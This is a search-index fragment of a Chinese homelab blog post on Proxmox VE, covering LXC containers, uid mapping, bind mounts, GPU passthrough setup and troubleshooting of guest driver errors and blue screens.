virtual machine\"</p> <p>\u66f4\u65b0\u4e00\u70b9\u76842022 Can't hide 'VM' status in Windows guest | Proxmox Support Forum</p> <p>In VM config: args: -cpu host,hv_vapic,hv_stimer,+invtsc,[more-flags],-hypervisor</p> <p>\u7ecf\u5c1d\u8bd5\u4e0a\u9762\u7684\u547d\u4ee4\u542f\u52a8\u65f6\u4f1a\u62a5\u9519\uff0c\u9700\u8981\u6dfb\u52a0\u66f4\u591aflag <pre><code>root@ryzen-pve \u279c  ~ qm start 200\nkvm: Hyper-V synthetic timers (hv-stimer) requires Hyper-V clocksources (hv-time)\nstart failed: QEMU exited with code 1\nroot@ryzen-pve \u279c  ~ vim /etc/pve/qemu-server/200.conf\nroot@ryzen-pve \u279c  ~ qm start 200\nkvm: Hyper-V synthetic timers (hv-stimer) requires Hyper-V synthetic interrupt controller (hv-synic)\nstart failed: QEMU exited with code 1\nroot@ryzen-pve \u279c  ~ vim /etc/pve/qemu-server/200.conf\nroot@ryzen-pve \u279c  ~ qm start 200\nkvm: Hyper-V synthetic interrupt controller (hv-synic) requires Hyper-V VP_INDEX MSR (hv-vpindex)\nstart failed: QEMU exited with code 1\n</code></pre></p> <p>\u6700\u540e\u9700\u8981\u8865\u5145\u5b8c\u6574\u5230 <pre><code>args: -cpu host,hv_vapic,hv_stimer,hv_time,hv_synic,hv_vpindex,+invtsc,-hypervisor\n</code></pre> \u6ce8\u610f\uff0c\u4e0d\u8981\u518d\u52a0cpu: x86-64-v3\u8fd9\u6837\u7684\u53c2\u6570\u4e86\u3002\u6211\u521a\u5f00\u59cb\u52a0\u4e86\uff0c\u5bfc\u81f4\u8fdb\u5165vm\uff0cN\u5361\u9a71\u52a8\u62a543\u9519\u8bef</p> <p>\u5176\u5b83 - virt-manger\u4e2d\u7c7b\u4f3c\u65b9\u6cd5\uff1a\u6c42\u52a9\uff01win11 wm \u6253\u5f00\u539f\u795e \u663e\u793a\u865a\u62df\u673a\u4e0b\u65e0\u6cd5\u8fd0\u884c - Chinese / \u7b80\u4f53\u4e2d\u6587 - Unraid - Proxmox VE(PVE)\u865a\u62df\u673a\u7ed5\u8fc7\u8f6f\u4ef6\u7684\u865a\u62df\u673a\u68c0\u67e5\u6765\u73a9\u539f\u795e - \u67d0\u54b8\u9c7c\u7684\u7b14\u8bb0 (wunote.cn)</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#lxc\u5bb9\u5668","title":"LXC\u5bb9\u5668","text":"<p>https://pve.proxmox.com/wiki/Linux_Container</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u5bb9\u5668\u955c\u50cf","title":"\u5bb9\u5668\u955c\u50cf","text":"<pre><code> pveam update\n pveam available\npveam available --section system\n\npveam download local debian-10.0-standard_10.0-1_amd64.tar.gz\n</code></pre> <p>\u5bfc\u5165\u5bb9\u5668\u955c\u50cf \u53ea\u80fd\u901a\u8fc7webui upload?</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#pct\u547d\u4ee4\u884c","title":"PCT\u547d\u4ee4\u884c","text":"<p>Linux Container - Proxmox VE</p> <pre><code>pct list\npct console &lt;vmid&gt; [OPTIONS]\npct enter &lt;vmid&gt;\n\npct start\n\npct destroy 100 --purge # --purge_, if you want to additionally remove the container from replication jobs, backup jobs and HA resource configurations.\n</code></pre> <pre><code># pct set 100 -net0 name=eth0,bridge=vmbr0,ip=192.168.15.147/24,gw=192.168.15.1\n</code></pre> <p>pct(1) (proxmox.com) TASK ERROR: unable to create CT 100 - unable to detect OS distribution <pre><code>pct create 100 /mnt/ryzen-pve-storage/template/cache/openwrt-23.05.0-x86-64-rootfs.tar.gz \\\n--storage local-lvm \\\n--ostype unmanaged \\\n--unprivileged 1 \\\n--hostname op1 \\\n--rootfs local-lvm:8 \\\n--cores 4 \\\n--memory 1024 \\\n--swap 1024 \\\n--features keyctl=1,nesting=1\n\n--password xxxx\n</code></pre></p> <pre><code>pct create 700 local:vztmpl/openwrt-23.05.0-x86-64-generic-rootfs.tar.gz \\\n--storage local-zfs \\\n--ostype unmanaged \\\n--unprivileged 1 \\\n--hostname op1 \\\n--rootfs local-zfs:1 \\\n--cores 4 \\\n--memory 1024 \\\n--swap 0 \\\n--features keyctl=1,nesting=1\n</code></pre> <p>unmanaged\u00a0can be used to skip and OS specific setup</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u914d\u7f6e\u6587\u4ef6_1","title":"\u914d\u7f6e\u6587\u4ef6","text":"<pre><code>/etc/pve/lxc/&lt;CTID&gt;.conf\n</code></pre> <p>Currently there are three types of mount points: storage backed mount points, bind mounts, and device mounts. - Storage Backed Mount Points     - Image based     - ZFS subvolumes     - Directories <pre><code>pct set 100 -mp0 thin1:10,mp=/path/in/container\n</code></pre></p> <ul> <li>Bind Mount Points\uff1aBind mounts allow you to access arbitrary directories from your Proxmox VE host inside a container <pre><code>pct set 100 -mp0 /mnt/bindmounts/shared,mp=/shared\n</code></pre></li> </ul>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u7279\u6743\u5bb9\u5668","title":"\u7279\u6743\u5bb9\u5668","text":"","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u7279\u6743\u5bb9\u5668\u8f6c\u975e\u7279\u6743\u5bb9\u5668","title":"\u7279\u6743\u5bb9\u5668\u8f6c\u975e\u7279\u6743\u5bb9\u5668","text":"<p>Convert privileged to unprivileged container | Proxmox Support Forum <pre><code>pct restore 1234 var/lib/vz/dump/vzdump-lxc-1234-2016_03_02-02_31_03.tar.gz -ignore-unpack-errors 1 -unprivileged\n</code></pre></p> <p>\u8f6c\u4e2a\u7279\u6743\u7ea7\u7ed3\u679c\u8fd9\u4e48\u9ebb\u70e6\u3002community\u6709\u901a\u8fc7\u6302\u8f7d\u955c\u50cf\uff0c\u7136\u540e\u4fee\u6539\u5176\u5185\u5bb9\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u770b\u4e0a\u53bb\u8c8c\u4f3c\u6709\u70b9\u91ce\uff0c\u56e0\u6b64\u8fd8\u662f\u4e0d\u4f7f\u7528\u4e86\u3002</p> <p>\u5c1d\u8bd5\u4e86 - \u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\u76f4\u63a5\u6dfb\u52a0unprivileged: yes\u3002\u4f46\u662f\u6253\u5f00\u5bb9\u5668\u540e\uff0c\u6240\u6709\u6587\u4ef6\u90fd\u53d8\u6210\u4e86nobody\u3002\uff08\u4e5f\u8bb8\u624b\u52a8chown\u4ee5\u4e0b\u5c31\u53ef\u4ee5\u4e86\uff1f\uff09 - \u5c1d\u8bd5\u6309\u7167\u5b98\u65b9\u901a\u8fc7backup\u6062\u590d\u3002   - \u4f46\u662f\u6062\u590d\u540e\uff0cjellyfin docker\u542f\u52a8\u4e0d\u8d77\u6765\uff0c\u8c8c\u4f3c\u662f\u6743\u9650\u7684\u95ee\u9898\u3002jellyfin\u914d\u7f6e\u6587\u4ef6\u4e0d\u77e5\u4e3a\u4f55\u5c31\u662f\u65e0\u6cd5chown\uff0croot\u7528\u6237chown\u7ed3\u679c\u62a5\u6ca1\u6709\u6743\u9650\u3002 <pre><code>pct restore 111 /var/lib/vz/dump/vzdump-lxc-110-2023_09_29-23_05_38.tar.zst -ignore-unpack-errors 1 -unprivileged --features keyctl=1,nesting=1  --storage local-zfs\n</code></pre></p> <p>\u7b97\u4e86\uff0c\u8fd8\u662f\u7528\u539f\u6765\u7279\u6743\u5bb9\u5668\u3002</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u8def\u5f84\u6620\u5c04\u6302\u8f7d","title":"\u8def\u5f84\u6620\u5c04\uff08\u6302\u8f7d\uff09","text":"<p>\u53c2\u8003   - Proxmox: bind mountpoint from host to unprivileged LXC container :: It's Embedded! (itsembedded.com)   - Unprivileged LXC containers - Proxmox VE</p> <p>Bind mounting\uff1a\u7c7b\u4f3c\u4e8e\u76ee\u5f55\u7684\u786c\u94fe\u63a5\uff08linux\u76ee\u5f55\u4e0d\u80fd\u786c\u94fe\u63a5\uff09</p> <p>\u76f4\u63a5\u6620\u5c04\uff08\u57fa\u672c\u4e0a\u53ea\u8bfb\uff09 - \u9700\u8981\u91cd\u542f\u5bb9\u5668\u751f\u6548 - host\u521b\u5efa\u7684\u6587\u4ef6\u5728guest\u4e2d\u4e3anobody\uff08\u53ea\u8981\u6587\u4ef6\u6743\u9650\u4e0d\u4e25\u683c\uff0c\u5e94\u8be5\u662f\u53ef\u8bfb\u7684\uff09 - guest\u521b\u5efa\u7684\u6587\u4ef6\u5728host\u4e0a\u4e3ahigh-mapped(100000+)  uid <pre><code># pct\u547d\u4ee4\npct set 300 -mp0 /mnt/Disk2/BT/downloads/links,mp=/media\n\n# \u914d\u7f6e\u6587\u4ef6\nmp0: /mnt/bindmounts/shared,mp=/shared\n</code></pre></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u7528\u6237\u6620\u5c04","title":"\u7528\u6237\u6620\u5c04","text":"<p>\u7f16\u8f91\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6 - 0 100000 1005\u8868\u793a0\u5f00\u59cb\u76841005\u957f\u5ea6\u6bb5\u6620\u5c04\u5230host 10000\u5f00\u59cb1005\u957f\u5ea6\u6bb5 - \u4ee5\u4e0b\u914d\u7f6e\u5c061005\u5355\u72ec\u6620\u5c04\u5230host 1005 <pre><code># uid map: from uid 0 map 1005 uids (in the ct) to the range starting 100000 (on the host), so 0..1004 (ct) \u2192 100000..101004 (host)\nlxc.idmap = u 0 100000 1005\nlxc.idmap = g 0 100000 1005\n# we map 1 uid starting from uid 1005 onto 1005, so 1005 \u2192 1005\nlxc.idmap = u 1005 1005 1\nlxc.idmap = g 1005 1005 1\n# we map the rest of 65535 from 1006 upto 101006, so 1006..65535 \u2192 101006..165535\nlxc.idmap = u 1006 101006 64530\nlxc.idmap = g 1006 101006 64530\n</code></pre></p> <pre><code>lxc.idmap = u 0 100000 1000\nlxc.idmap = g 0 100000 1000\nlxc.idmap = u 1000 1000 1\nlxc.idmap = g 1000 1000 1\nlxc.idmap = u 1001 101001 64534\nlxc.idmap = g 1001 101001 64534\n</code></pre> <p>\u7f16\u8f91/etc/suuid(subgid)\uff0c\u4f7f\u5f97root\u7528\u6237\u5141\u8bb8\u4f7f\u75281000\u7684uid <pre><code>root:100000:65536\nroot:1000:1\n</code></pre> \u5426\u5219\u4f1a\u62a5\u5982\u4e0b\u9519\u8bef <pre><code>lxc_map_ids: 3701 newuidmap failed to write mapping \"newuidmap: uid range [1000-1001) -&gt; [1000-1001) not allowed\": newuidmap 793824 0 100000 1000 1000 1000 1 1001 101001 64534  \nlxc_spawn: 1788 Failed to set up id mapping.  \n__lxc_start: 2107  \nTASK ERROR: startup for container '110' failed\n</code></pre></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u6dfb\u52a0gpu","title":"\u6dfb\u52a0gpu","text":"<p>\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0 <pre><code>lxc.cgroup2.devices.allow: c 226:0 rwm\nlxc.cgroup2.devices.allow: c 226:128 rwm\nlxc.cgroup2.devices.allow: c 29:0 rwm\nlxc.mount.entry: /dev/dri dev/dri none bind,optional,create=dir\nlxc.mount.entry: /dev/fb0 dev/fb0 none bind,optional,create=file\nlxc.apparmor.profile: unconfined\n</code></pre></p> <p>lxc.cgroup2.devices.allow\u8bbe\u7f6e\u5141\u8bb8\u5728LXC\u5bb9\u5668\u4e2d\u4f7f\u7528\u7684\u8bbe\u5907\u89c4\u5219 - <code>c</code> \u8868\u793a\u5b57\u7b26\u8bbe\u5907\u3002 - <code>195:*</code> \u662f\u4e00\u4e2a\u8bbe\u5907\u89c4\u5219\uff0c\u5b83\u6307\u5b9a\u4e86\u4e00\u7ec4\u5141\u8bb8\u7684\u5b57\u7b26\u8bbe\u5907\u3002\u5728\u8fd9\u91cc\uff0c<code>195</code> \u662f\u4e3b\u8bbe\u5907\u53f7\uff08major number\uff09\uff0c\u800c <code>*</code> \u8868\u793a\u5141\u8bb8\u4efb\u4f55\u6b21\u8bbe\u5907\u53f7\uff08minor number\uff09\uff0c\u8fd9\u610f\u5473\u7740\u5141\u8bb8\u4f7f\u7528\u4e3b\u8bbe\u5907\u53f7\u4e3a 195 \u7684\u6240\u6709\u5b57\u7b26\u8bbe\u5907\u3002 - <code>rwm</code> \u8868\u793a\u6743\u9650\u8bbe\u7f6e\uff0c<code>r</code> \u8868\u793a\u5141\u8bb8\u8bfb\u53d6\uff0c<code>w</code> \u8868\u793a\u5141\u8bb8\u5199\u5165\uff0c<code>m</code> \u8868\u793a\u5141\u8bb8\u521b\u5efa\u8bbe\u5907\u6587\u4ef6\u3002</p> <p><code>lxc.mount.entry: /dev/dri dev/dri none bind,optional,create=dir</code> - \u8fd9\u4e2a\u914d\u7f6e\u6761\u76ee\u5c06\u4e3b\u673a\u4e0a\u7684 <code>/dev/dri</code> \u76ee\u5f55\u6302\u8f7d\u5230 LXC \u5bb9\u5668\u5185\u7684 <code>dev/dri</code> \u76ee\u5f55\u3002 - <code>none</code> \u8868\u793a\u6ca1\u6709\u7279\u5b9a\u7684\u6587\u4ef6\u7cfb\u7edf\u7c7b\u578b\u3002 - <code>bind</code> \u8868\u793a\u4f7f\u7528\u7ed1\u5b9a\u6302\u8f7d\uff08bind mount\uff09\uff0c\u8fd9\u610f\u5473\u7740\u5bb9\u5668\u5185\u7684 <code>dev/dri</code> \u76ee\u5f55\u4f1a\u6620\u5c04\u5230\u4e3b\u673a\u4e0a\u7684 <code>/dev/dri</code> \u76ee\u5f55\uff0c\u5bb9\u5668\u5185\u7684\u64cd\u4f5c\u5c06\u5f71\u54cd\u5230\u4e3b\u673a\u4e0a\u7684\u8bbe\u5907\u3002 - <code>optional</code> \u8868\u793a\u8fd9\u4e2a\u6302\u8f7d\u662f\u53ef\u9009\u7684\uff0c\u5982\u679c <code>/dev/dri</code> \u5728\u4e3b\u673a\u4e0a\u4e0d\u5b58\u5728\uff0c\u5bb9\u5668\u4ecd\u7136\u4f1a\u542f\u52a8\u3002 - <code>create=dir</code> \u8868\u793a\u5982\u679c\u5bb9\u5668\u5185\u7684\u76ee\u5f55\u4e0d\u5b58\u5728\uff0c\u5b83\u5c06\u5728\u5bb9\u5668\u5185\u521b\u5efa\u4e00\u4e2a\u76ee\u5f55\u3002 - <code>create=file</code> \u8868\u793a\u5982\u679c\u5bb9\u5668\u5185\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5b83\u5c06\u5728\u5bb9\u5668\u5185\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6</p> <p>AppArmor \u662f\u4e00\u4e2a Linux \u5185\u6838\u5b89\u5168\u6a21\u5757\uff0c\u7528\u4e8e\u9650\u5236\u7a0b\u5e8f\u7684\u80fd\u529b\uff0c\u5305\u62ec\u5bb9\u5668\uff0c\u4ee5\u589e\u5f3a\u5b89\u5168\u6027\u3002 <code>lxc.apparmor.profile</code> \u88ab\u8bbe\u7f6e\u4e3a \"unconfined\"\uff0c\u8fd9\u610f\u5473\u7740\u5bb9\u5668\u4e0d\u53d7 AppArmor \u4e2a\u4eba\u8d44\u6599\u7684\u9650\u5236\u3002\u5b83\u6709\u66f4\u591a\u81ea\u7531\uff0c\u4f46\u4e5f\u6709\u8f83\u5c11\u7684\u5b89\u5168\u9650\u5236\u3002</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u65e0\u6cd5\u521b\u5efaopenwrt","title":"\u65e0\u6cd5\u521b\u5efaopenwrt","text":"<p>\u4eceopenwrt\u4e0b\u8f7d\u7684rootfs\u65e0\u6cd5\u521b\u5efalxc\u5bb9\u5668\u4e86 <pre><code>TASK ERROR: unable to create CT 102 - unable to detect OS distribution\n</code></pre></p> <p>\u5fc5\u987b\u547d\u4ee4\u884c\u8bbe\u7f6eostype <pre><code>pct create 102 local:vztmpl/openwrt-23.05.0-x86-64-imagebuilder.tar.gz \\\n--storage local-zfs \\\n--ostype unmanaged \\\n--unprivileged 1 \\\n--hostname op9 \\\n--rootfs local-zfs:1 \\\n--cores 4 \\\n--memory 512 \\\n--swap 0 \\\n--features keyctl=1,nesting=1\n</code></pre></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u5907\u4efd\u548c\u6062\u590d","title":"\u5907\u4efd\u548c\u6062\u590d","text":"<p>Backup and Restore - Proxmox VE</p> <p>LXC <pre><code> pct restore 100 vzdump-lxc-100-2023_10_03-15_38_23.tar.zst --storage local-zfs\n</code></pre></p> <p>qm <pre><code>\n</code></pre></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#pve\u663e\u5361\u76f4\u901a","title":"PVE\u663e\u5361\u76f4\u901a","text":"<p>PCI(e) Passthrough - Proxmox VE PCI Passthrough - Proxmox VE (7) The Ultimate Beginner's Guide to GPU Passthrough (Proxmox, Windows 10) : homelab (reddit.com)</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u975egrub\u4fee\u6539\u5185\u6838\u53c2\u6570\u65b9\u6cd5","title":"\u975egrub\u4fee\u6539\u5185\u6838\u53c2\u6570\u65b9\u6cd5","text":"<p>\u6211\u4f7f\u7528zfs\uff0cpve8.0 root\u5206\u533a\u4e5f\u4f4d\u4e8ezfs\uff0c\u4f7f\u7528systemd-boot\u5f15\u5bfc\u3002\u56e0\u6b64\u5185\u6838\u53c2\u6570\u9700\u8981\u5728<code>/etc/kernel/cmdline</code>\u4fee\u6539\u3002</p> <ul> <li>Grub\uff1aThe kernel commandline needs to be placed in the variable\u00a0GRUB_CMDLINE_LINUX_DEFAULT\u00a0in the file\u00a0<code>/etc/default/grub</code>. Running\u00a0<code>update-grub</code>\u00a0appends its content to all\u00a0linux\u00a0entries in\u00a0/boot/grub/grub.cfg.</li> <li>Systemd-boot</li> <li>The kernel commandline needs to be placed as one line in\u00a0<code>/etc/kernel/cmdline</code>. To apply your changes, run\u00a0<code>proxmox-boot-tool refresh</code>, which sets it as the\u00a0option\u00a0line for all config files in\u00a0<code>loader/entries/proxmox-*.conf</code>.</li> </ul>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u6b65\u9aa4","title":"\u6b65\u9aa4","text":"","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u4fee\u6539\u5185\u6838\u53c2\u6570","title":"\u4fee\u6539\u5185\u6838\u53c2\u6570","text":"<p>p.s grub\u548csystemd-boot\u4fee\u6539\u65b9\u6cd5\u4e0d\u4e00\u6837\uff0c\u8fd9\u91cc\u4ee5systemd-boot\u4e3a\u8bf4\u660e</p> <ul> <li><code>intel_iommu=on | amd_iommu=on</code>\uff1aFor Intel CPUs, you may also need to enable the IOMMU on the\u00a0kernel command line\u00a0for older (pre-5.15) kernels. For AMD CPUs it should be enabled automatically.</li> <li> <p><code>iommu=pt</code>\uff1aIf your hardware supports IOMMU passthrough mode, enabling this mode might increase performance.</p> </li> <li> <p>(optional)\u542f\u7528acs override</p> </li> </ul> <p>\u6700\u540e\u7684\u5185\u6838\u53c2\u6570 <pre><code>/etc/kernel/cmdline\nroot=ZFS=rpool/ROOT/pve-1 boot=zfs amd_iommu=on iommu=pt pcie_acs_override=downstream,multifunction\n</code></pre></p> <p>\u66f4\u65b0\u5f15\u5bfc\u53c2\u6570 <code>proxmox-boot-tool refresh</code></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#kernel-module","title":"kernel module","text":"","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u8bbe\u7f6e\u5c3d\u65e9\u52a0\u8f7d","title":"\u8bbe\u7f6e\u5c3d\u65e9\u52a0\u8f7d","text":"<p>\u4fdd\u8bc1\u4ee5\u4e0bmodule\u5c3d\u65e9\u52a0\u8f7d\uff0c\u5c06\u5176\u6dfb\u52a0\u5230<code>/etc/modules</code> <pre><code>vfio\nvfio_iommu_type1\nvfio_pci\nvfio_virqfd\n</code></pre></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u8bbe\u7f6e\u6a21\u5757\u53c2\u6570","title":"\u8bbe\u7f6e\u6a21\u5757\u53c2\u6570","text":"<p>\u4fee\u6539\u4e00\u4e9b\u5185\u6838\u6a21\u5757\u7684\u53c2\u6570\uff0c\u4f4d\u4e8e<code>/etc/modprobe.d</code></p> <p>vifo.conf - disable_vga\u540e\uff0cpve\u542f\u52a8\u65f6\u663e\u793a\u5668\u4f1a\u65e0\u6cd5\u4f7f\u7528\uff08vifo\u63a5\u7ba1\u663e\u5361\u540e\uff0c\u5c4f\u5e55\u4fbf\u4f1a\u5361\u4f4f\u4e0d\u53d8\u4e86\uff09 <pre><code>options vfio-pci ids=10de:1b81,10de:10f0,10de:1c02,10de:10f1 disable_vga=1\n</code></pre></p> <p>kvm.conf <pre><code>options kvm ignore_msrs=1 report_ignored_msrs=0\n</code></pre></p> <p>blacklist.conf <pre><code>blacklist nouveau\nblacklist nvidia*\n</code></pre></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u66f4\u65b0initramfs","title":"\u66f4\u65b0initramfs","text":"<p>\u6bcf\u5f53\u4fee\u6539\u5185\u6838\u6a21\u5757\u540e\uff0c\u9700\u8981\u91cd\u65b0\u751f\u6210initramfs\u3002 <code>update-initramfs -u</code> - u: update - k: \u6307\u5b9a\u4e00\u4e2a\u5185\u6838\u7248\u672c\u6216\u8005all\u6307\u5b9a\u6240\u6709</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#acs-override","title":"ACS override","text":"<p>VFIO tips and tricks: VFIO+VGA FAQ</p> <p>pcie_acs_override = \u00a0 \u00a0 \u00a0 \u00a0 [PCIE] Override missing PCIe ACS support for: \u00a0 \u00a0 downstream \u00a0 \u00a0 \u00a0 \u00a0 All downstream ports - full ACS capabilties \u00a0 \u00a0 multifunction \u00a0 \u00a0 \u00a0 \u00a0 All multifunction devices - multifunction ACS subset \u00a0 \u00a0 id:nnnn:nnnn \u00a0 \u00a0 \u00a0 \u00a0 Specfic device - full ACS capabilities \u00a0 \u00a0 \u00a0 \u00a0 Specified as vid:did (vendor/device ID) in hex</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u7b2c\u4e00\u5f20gpu\u76f4\u901a\u95ee\u9898","title":"\u7b2c\u4e00\u5f20gpu\u76f4\u901a\u95ee\u9898","text":"<p>960\uff08\u7b2c\u4e00\u4e2a\u69fd\uff09\uff0c\u9700\u8981\u5173\u95ed\u663e\u793a\u5668\u91cd\u542fpve\uff0c\u624d\u80fd\u6b63\u786e\u5de5\u4f5c\u3002\u6dfb\u52a0\u5185\u6838\u53c2\u6570video=efifb:off\u540e\uff0c\u8fde\u63a5\u663e\u793a\u5668\u91cd\u542f\u6ca1\u95ee\u9898\uff1f</p> <p><code>video=efifb:off</code>\u00a0and related kernel parameters don't work on Proxmox anymore. Use\u00a0this work-around\u00a0when doing\u00a0passthrough\u00a0of the boot (or only) GPU. Also,\u00a0<code>amd_iommu=on</code>\u00a0really does nothing and\u00a0<code>iommu=pt</code>\u00a0does mostly nothing. And\u00a0not all\u00a0Proxmox installations use GRUB.</p> <p>What a nice post! I've been looking for a solution to this BAR 3 issues all night. Big Thanks! By the way, I also found better solution on a reddit post. It is adding \"<code>initcall_blacklist=sysfb_init</code>\" to kernel parameter. No need \"<code>video=efifb:off</code>\" or \"<code>video=simplefb:off</code>\" in kernel parameter. I also tested, it does solve the problem! Reference: https://www.reddit.com/r/VFIO/comme...let_simplefb_stay_away_from_the_gpu/?sort=old https://www.reddit.com/r/Proxmox/comments/vc9hw3/latest_proxmox_7_the_kernel_breaks_my_gpu/?sort=old</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#amd-6500xt-43\u9519\u8bef","title":"amd 6500xt 43\u9519\u8bef","text":"<p>\u7ed9czw\u76f4\u901a6500xt\uff0c\u7ed3\u679c\u5373\u4f7f\u5b89\u88c5\u5b8camd\u9a71\u52a8\u540e\u4ecd\u7136\u62a543\u9519\u8bef\u3002\u6700\u540e\u53d1\u73b0\u662fAMD GPU\u7684\u95ee\u9898\uff0c\u9700\u8981\u5173\u95edResizable BAR/Smart Access Memory\u00a0https://pve.proxmox.com/wiki/PCI_Passthrough#BIOS_options </p> <p>\"Resizable BAR'/'Smart Access Memory': Some AMD GPUs (Vega and up) experience 'Code 43' in Windows guests if this is enabled on the host. It's not supported in VMs either way (yet), so the recommended setting is 'off'.\"</p> <p>https://forum.proxmox.com/threads/gpu-passthrough-radeon-6800xt-and-beyond.86932/post-561971</p> <p>\u603b\u7ed3 - \u6709\u7528   - \u5173\u95edbios csm\u548csmart access memory   - \u6dfb\u52a0\u5185\u6838\u53c2\u6570<code>initcall_blacklist=sysfb_init</code>\uff08<code>video=efifb:off</code>\u4ecd\u7136\u4fdd\u7559\uff09\uff0c\u91cd\u542fpve - \u65e0\u7528   - \u6211\u81ea\u5df1\u8bc4\u8bba\u7684\uff1aI firstly tryed another method, since driver 43 error is a common problem when using libvirt to create VM. see\u00a0ovmf arch wiki 43.\u00a0 So I did similar thing: edit guest qemu config file(/etc/pve/qemu-sever/ VM id.conf), modify cpu property to \"cpu: host,hidden=1,hv-vender-id=123456789\".</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#windows\u968f\u673a\u84dd\u5c4fbosd","title":"windows\u968f\u673a\u84dd\u5c4fBOSD","text":"<p>VIDEO_DXGKRNL - 10\u6765\u5206\u949f\u5c31\u84dd\u5c4f\uff0c\u6ca1\u6709\u89e6\u53d1\u6761\u4ef6 - gfe\u5b89\u88c5\u6700\u65b0\u9a71\u52a8\uff0c\u5b89\u88c5\u5b8c\u6210\u65f6\u9ed1\u5c4f\uff0c\u53ea\u80fd\u5728pve console\u91cc\u64cd\u4f5c\u3002     - \u53ef\u4ee5\u518d\u6b21\u70b9\u51fb\u5feb\u901f\u5b89\u88c5\u5b89\u88c5\u9a71\u52a8     - \u53ef\u4ee5\u770b\u5230\u8bbe\u5907\u7ba1\u7406\u5668\u4e2d\u663e\u5361\u62a513\u9519\u8bef     - \u91cd\u542f\u540e\u663e\u793a\u5b89\u88c5\u4e0a\u4e86\uff0c\u4f46\u662f\u5982\u679c\u91cd\u65b0\u5b89\u88c5\u53c8\u662f\u4ee5\u4e0a\u6b65\u9aa4</p> <p>\u5c1d\u8bd5 - \u5173\u95edvnc, parsec, \u5c0f\u98de\u673a\u7b49\u53ef\u80fd\u4fee\u6539\u663e\u5361\u7684\u8f6f\u4ef6 - \u52fe\u4e0aprimay gpu - \u4f7f\u7528\u7f51\u4e0a\u4e0b\u8f7d\u7684msi \u516c\u7248vbios\uff0c\u8bbe\u7f6eromfile\u53c2\u6570VGA Bios Collection: MSI GTX 1070 8 GB | TechPowerUp - \u5b89\u88c5studio\u9a71\u52a8\uff08\u4ecd\u7136\u4f1a\u6709\u4e0a\u9762\u95ee\u9898\uff09</p> <p>Urgent Help, Windows 10 Crash!!! BSOD VIDEO_DXGKRNL_FATAL_ERROR | Proxmox Support Forum</p> <p>\u628a\u4e0b\u9762\u53e5\u5b50\u7ffb\u8bd1\u6210\u82f1\u6587\uff1a \u6211\u9047\u5230\u4e86\u5b8c\u5168\u4e00\u6837\u7684\u95ee\u9898\uff0c\u6211\u7684win10\u865a\u62df\u673a\u6700\u8fd1\u5f00\u59cb\u968f\u673a\u84dd\u5c4f\u3002\u5b83\u8fc7\u53bb3\u4e2a\u661f\u671f\u662f\u5f88\u6b63\u5e38\u7684\u3002\u6211\u5c1d\u8bd5\u4e86\u5f88\u591a\u65b9\u6cd5\uff08reinstall win10, try win11, pass vbios rom file\uff09\uff0c\u95ee\u9898\u4ecd\u6ca1\u89e3\u51b3\u3002\u76f4\u5230\u6211\u770b\u5230\u4e86\u4f60\u7684\u5e16\u5b50\uff0c\u6211\u4e5f\u5c1d\u8bd5\u628aCPU\u4ecehost\u6539\u4e3akvm64\uff0c\u95ee\u9898\u5c45\u7136\u795e\u5947\u7684\u89e3\u51b3\u4e86\u3002</p> <p>\u7ecf\u8fc7\u6211\u4e4b\u524d\u975e\u5e38\u591a\u7684\u5c1d\u8bd5\uff0c\u6211\u53d1\u73b0\u4e86\u4e00\u4e2a\u80fd\u591f\u7a33\u5b9a\u89e6\u53d1BOSD\u7684\u65b9\u6cd5\uff0c\u90a3\u5c31\u662f\u4f7f\u7528GPU-Z\u8f6f\u4ef6\u5bfc\u51faGPU\u7684vbios\uff0c\u6bcf\u6b21\u786e\u8ba4\u5bfc\u51fa\u65f6\uff0cwin10\u7cfb\u7edf\u5c31\u4f1a\u84dd\u5c4f\u3002</p> 